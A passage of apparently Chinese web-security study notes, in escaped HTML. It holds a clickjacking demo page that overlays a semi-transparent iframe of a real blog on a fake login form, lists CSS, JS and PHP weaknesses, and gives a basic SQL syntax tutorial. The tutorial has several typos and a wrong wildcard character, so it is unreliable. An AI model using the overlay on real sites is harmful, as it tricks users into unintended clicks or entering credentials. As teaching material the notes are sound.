pan&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            clickJack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;&amp;lt;!--CSS--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-css&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;        &lt;span class=&#34;selector-tag&#34;&gt;iframe&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;            &lt;span class=&#34;attribute&#34;&gt;width&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;500px&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;            &lt;span class=&#34;attribute&#34;&gt;height&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;500px&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;            &lt;span class=&#34;attribute&#34;&gt;position&lt;/span&gt;:absolute;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;            &lt;span class=&#34;attribute&#34;&gt;top&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;attribute&#34;&gt;left&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;            &lt;span class=&#34;attribute&#34;&gt;filter&lt;/span&gt;:&lt;span class=&#34;built_in&#34;&gt;alpha&lt;/span&gt;(opacity=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;            &lt;span class=&#34;attribute&#34;&gt;opacity&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0.5&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;This is H1&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;This is H2&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                UserName:&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                PassWord:&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dl&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dt&lt;/span&gt;&amp;gt;&lt;/span&gt;Coffee&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dt&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dd&lt;/span&gt;&amp;gt;&lt;/span&gt;Black hot drink&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dd&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dt&lt;/span&gt;&amp;gt;&lt;/span&gt;Milk&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dt&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dd&lt;/span&gt;&amp;gt;&lt;/span&gt;White cold drink&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dd&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dl&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h3&lt;/span&gt;&amp;gt;&lt;/span&gt;This is H3&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h3&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h4&lt;/span&gt;&amp;gt;&lt;/span&gt;This is H4&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h4&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;iframe clickjack&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;https://blog.csdn.net/qq_51902218&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;iframe&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;css潜在漏洞&#34;&gt; （CSS）潜在漏洞&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;纯 css 漏洞很少&lt;/li&gt;
&lt;li&gt;存在键盘监控漏洞&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;js潜在漏洞&#34;&gt; （JS）潜在漏洞&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;纯 JS 漏洞很多&lt;/li&gt;
&lt;li&gt;典型 xss&lt;/li&gt;
&lt;li&gt;csrf&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;php潜在漏洞&#34;&gt; （PHP）潜在漏洞&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;数据库&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;sql注入&#34;&gt; （SQL）注入&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span id=&#34;sql&#34;&gt; SQL&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;SQL 对大小写不敏感：SELECT 与 select 是相同的。&lt;/li&gt;
&lt;li&gt;一些重要的 SQL 命令&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;select - 从数据库提取数据&lt;/li&gt;
&lt;li&gt;update - 更新数据库中的数据&lt;/li&gt;
&lt;li&gt;delete - 从数据库中删除数据&lt;/li&gt;
&lt;li&gt;insert into - 向数据库中插入新数据&lt;/li&gt;
&lt;li&gt;create database - 创建新数据库&lt;/li&gt;
&lt;li&gt;alter database - 修改数据库&lt;/li&gt;
&lt;li&gt;create table - 创建新表&lt;/li&gt;
&lt;li&gt;alter table - 变更 (改变) 数据库表&lt;/li&gt;
&lt;li&gt;drop table - 删除表&lt;/li&gt;
&lt;li&gt;create index - 创建索引 (搜索键)&lt;/li&gt;
&lt;li&gt;drop index - 删除索引&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;select 语句&lt;br&gt;
 select 语句用于从数据库中选取数据。&lt;br&gt;
结果被存储在一个结果表中，称为结果集。&lt;br&gt;
语法：&lt;br&gt;
select column_name,column_name&lt;br&gt;
from table_name;&lt;br&gt;
 或者&lt;br&gt;
 select * from table_name;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取 “name” 和 “country” 列：&lt;br&gt;
select name,country from Websites;&lt;/li&gt;
&lt;li&gt;select distinct 语句&lt;br&gt;
 select distinct 语句用于返回唯一不同的值。&lt;br&gt;
在表中，一个列可能会包含多个重复值，有时您也许希望仅仅列出不同（distinct）的值。&lt;br&gt;
distinct 关键词用于返回唯一不同的值。&lt;br&gt;
语法&lt;br&gt;
 select distinct column_name,column_name&lt;br&gt;
from table_name;&lt;br&gt;
 下面的 SQL 语句仅从 “Websites” 表的 “country” 列中选取唯一不同的值，也就是去掉 “country” 列重复值：&lt;br&gt;
select distinct country from Websites;&lt;/li&gt;
&lt;li&gt;where 子句&lt;br&gt;
 where 子句用于提取那些满足指定条件的记录&lt;br&gt;
语法&lt;br&gt;
 select column_name,column_name&lt;br&gt;
from table_name&lt;br&gt;
where column_name operator value;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取国家为 “CN” 的所有网站：&lt;br&gt;
select * from Websites where country=‘CN’;&lt;/li&gt;
&lt;li&gt;引号&lt;br&gt;
 SQL 使用单引号来环绕文本值（大部分数据库系统也接受双引号）。&lt;br&gt;
如果是数值字段，请不要使用引号。&lt;br&gt;
WHERE 子句中的运算符&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;运算符&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;=&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;等于&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;lt;&amp;gt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;不等于或者！=&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;gt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;大于&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;lt;&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;小于&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;gt;=&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;大于等于&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&amp;lt;=&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;小于等于&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;between&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;在某个范围内&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;like&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;搜索某种形式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;in&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;指定针对某个列的多个可能值&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;and &amp;amp; or 运算符&lt;br&gt;
 and &amp;amp; or 运算符用于基于一个以上的条件对记录进行过滤。&lt;br&gt;
如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。&lt;br&gt;
如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。&lt;br&gt;
下面的 SQL 语句从 “Websites” 表中选取国家为 “CN” 且 alexa 排名大于 “50” 的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where country=‘CN’&lt;br&gt;
and alexa &amp;gt; 50;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取国家为 “USA” 或者 “CN” 的所有客户：&lt;br&gt;
selecct * from Websites&lt;br&gt;
where country=‘USA’&lt;br&gt;
or country=‘CN’;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取 alexa 排名大于 “15” 且国家为 “CN” 或 “USA” 的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where alexa &amp;gt; 15&lt;br&gt;
and (country=‘CN’ or country=‘USA’);&lt;/li&gt;
&lt;li&gt;order by 关键字&lt;br&gt;
 order by 关键字用于对结果集按照一个列或者多个列进行排序。&lt;br&gt;
order by 关键字默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，您可以使用 desc 关键字。&lt;br&gt;
语法：&lt;br&gt;
select column_name,column_name&lt;br&gt;
from table_name&lt;br&gt;
order by  column_name,column_name asc|desc;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取所有网站，并按照 “alexa” 列排序：&lt;br&gt;
select * from Websites&lt;br&gt;
order by alexa;&lt;br&gt;
 下面的 SQL 语句从 “Websites” 表中选取所有网站，并按照 “alexa” 列降序排序：&lt;br&gt;
select * from Websites&lt;br&gt;
order by alexa desc&lt;/li&gt;
&lt;li&gt;insert into 语句&lt;br&gt;
 insert into 语句用于向表中插入新记录。&lt;br&gt;
语法：&lt;br&gt;
第一种形式无需指定要插入数据的列名，只需提供被插入的值即可：&lt;br&gt;
insert into table_name&lt;br&gt;
values (value1,value2,value3,…);&lt;br&gt;
 第二种形式需要指定列名及被插入的值：&lt;br&gt;
insert into table_name (column1,column2,column3,…)&lt;br&gt;
values (value1,value2,value3,…);&lt;br&gt;
 假设我们要向 “Websites” 表中插入一个新行。&lt;br&gt;
insert into Websites (name, url, alexa, country)&lt;br&gt;
 values (‘百度’,‘&lt;a href=&#34;https://www.baidu.com/&#39;,&#39;4&#39;,&#39;CN&#34;&gt;https://www.baidu.com/’,‘4’,&#39;CN&lt;/a&gt;’);&lt;/li&gt;
&lt;li&gt;update 语句&lt;br&gt;
 update 语句用于更新表中的记录。(改变值)&lt;br&gt;
 语法：&lt;br&gt;
update table_name&lt;br&gt;
set column1=value1,column2=value2,…&lt;br&gt;
where some_column=some_value;&lt;br&gt;
 假设我们要把 “菜鸟教程” 的 alexa 排名更新为 5000，country 改为 USA。&lt;br&gt;
update Websites&lt;br&gt;
set alexa=‘5000’, country=‘USA’&lt;br&gt;
where name=‘菜鸟教程’;&lt;/li&gt;
&lt;li&gt;delete 语句&lt;br&gt;
 delete 语句用于删除表中的记录。&lt;br&gt;
语法:&lt;br&gt;
delete from table_name&lt;br&gt;
where some_column=some_value;&lt;br&gt;
 假设我们要从 “Websites” 表中删除网站名为 “Facebook” 且国家为 USA 的网站。&lt;br&gt;
delete from Websites&lt;br&gt;
where name=‘Facebook’ and country=‘USA’;&lt;br&gt;
 删除所有数据&lt;br&gt;
 delete from table_name;&lt;br&gt;
 或&lt;br&gt;
 delete * from table_name;&lt;/li&gt;
&lt;li&gt;select top,limit,rownum 子句&lt;br&gt;
 select top 子句用于规定要返回的记录的数目。&lt;br&gt;
注意：并非所有的数据库系统都支持 select top 语句。 MySQL 支持 limit 语句来选取指定的条数数据， Oracle 可以使用 roenum 来选取。&lt;br&gt;
SQL Server / MS Access 语法&lt;br&gt;
 select top number|percent column_name (s)&lt;br&gt;
from table_name;&lt;br&gt;
MySQL 语法&lt;br&gt;
 select column_name (s)&lt;br&gt;
from table_name&lt;br&gt;
limit number;&lt;br&gt;
Oracle 语法&lt;br&gt;
 select column_name (s)&lt;br&gt;
from table_name&lt;br&gt;
where rownum &amp;lt;= number;&lt;br&gt;
 在 Microsoft SQL Server 中还可以使用百分比作为参数。&lt;br&gt;
下面的 SQL 语句从 websites 表中选取前面百分之 50 的记录：&lt;br&gt;
select top 50 percent * from Websites;&lt;/li&gt;
&lt;li&gt;like 操作符&lt;br&gt;
 like 操作符用于在 where 子句中搜索列中的指定模式。&lt;br&gt;
语法:&lt;br&gt;
select column_name(s)&lt;br&gt;
from table_name&lt;br&gt;
where column_name like pattern;&lt;br&gt;
 下面的 SQL 语句选取 name 以字母 “G” 开始的所有客户：&lt;br&gt;
selectT * from Websites&lt;br&gt;
where name LIKE ‘G%’;&lt;br&gt;
“%” 符号用于在模式的前后定义通配符（默认字母）。&lt;br&gt;
通过使用 not 关键字，您可以选取不匹配模式的记录。&lt;br&gt;
下面的 SQL 语句选取 name 不包含模式 “oo” 的所有客户：&lt;br&gt;
select * from Websites&lt;br&gt;
where name not like ‘%oo%’;&lt;/li&gt;
&lt;li&gt;SQL 通配符&lt;br&gt;
通配符可用于替代字符串中的任何其他字符。&lt;br&gt;
在 SQL 中，通配符与 SQL like 操作符一起使用。&lt;br&gt;
在 SQL 中，可使用以下通配符：&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;通配符&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;%&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;替代 0 个或多个字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;-&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;替代一个字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;[charlist]&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符列中的任何单一字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;[^charlist] 或 [!charlist]&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;不在字符列中的任何单一字符&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;下面的 SQL 语句选取 url 以字母 “https” 开始的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where url like ‘https%’;&lt;br&gt;
 下面的 SQL 语句选取 name 以一个任意字符开始，然后是 “oogle” 的所有客户：&lt;br&gt;
select * from Websites&lt;br&gt;
where name like ‘_oogle’;&lt;br&gt;
 下面的 SQL 语句选取 name 以 “G” 开始，然后是一个任意字符，然后是 “o”，然后是一个任意字符，然后是 “le” 的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
where name like ‘G_o_le’;&lt;br&gt;
 下面的 SQL 语句选取 name 以 “G”、“F” 或 “s” 开始的所有网站：&lt;br&gt;
select * from Websites&lt;br&gt;
